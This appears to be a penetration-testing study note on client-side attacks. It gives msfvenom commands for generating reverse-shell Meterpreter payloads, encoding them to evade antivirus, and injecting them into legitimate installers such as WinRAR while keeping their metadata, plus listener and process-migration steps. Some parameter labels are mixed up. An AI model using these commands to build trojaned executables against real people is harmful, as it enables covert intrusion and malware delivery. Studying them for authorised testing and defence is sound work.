- Attacks that involve coercing a client to execute a malicious payload on their system that connects back to the attacker when executed.

## Generate Payload w/ #tools/payloads/msfvenom 
*msfvenom is made up of msfpayload and msfencode*
- List payloads
	```
	msfvenom --list payloads
	```
- Payload generation steps
	- Check the target OS
	- Check the architecture
	- Meterpreter or something else
	- How do you want the reverse connection
- Payload types:
	- Staged Payload: `.../.../meterpreter/...`
	- Unstaged Payload: `.../.../meterpreter_...`
- Generate a payload:
	```
	msfvenom \
	-a x86 \ 
	-p <payload_type> \
	LHOST=<target_ip> \
	LPORT=<target_port> \
	-f <output_type> > <file>
	```
- Output file formats
	```
	msfvenom --list formats
	```
- Transfer these files easily by starting a web server and the downloading them on the target machine.
- Start a listener on your machine before running the executable on target
	```
	msfconsole> use multi/handler
	<set options>
	```

## Encoding Payloads w/ Msfvenom
- AVs use signatures to detect malicious files
- Some older AVs can be evaded by encoding our payloads
- List all encoders
	```
	msfvenom --list encoders
	```
- Two best encoders
	- Powershell Base 64
	- Shikata ga nai
- Encoding
	```
	msfvenom -p <payload> \
	LHOST=<target_host> \
	LPORT=<target_port> \
	-i <iterations | beyond 10 not useful> \
	-e <encoder> \
	-f <output_type> > <output_file> \
	```
- Then the same as with normal msfvenom payload.

## Injecting Payloads Into Portable Executables
- Use the `-x` (template) or `-k` (keep)
- Injecting in WinRAR installation
```
	msfvenom -p <payload>
	LHOST=<ip>
	LPORT=<port>
	-e <encoder>
	-i 10
	-f <output_file>
	-x <file into which payloads needs to be injected> > <output _file>
```
*`-k` might or might not work*
- This maintains the metadata of the original file.
- With `-t` you wont be able to run the original installer but with adding `-k` you can do that
- As soon as you get access of the target machine on metasploit, `migrate` to another process.

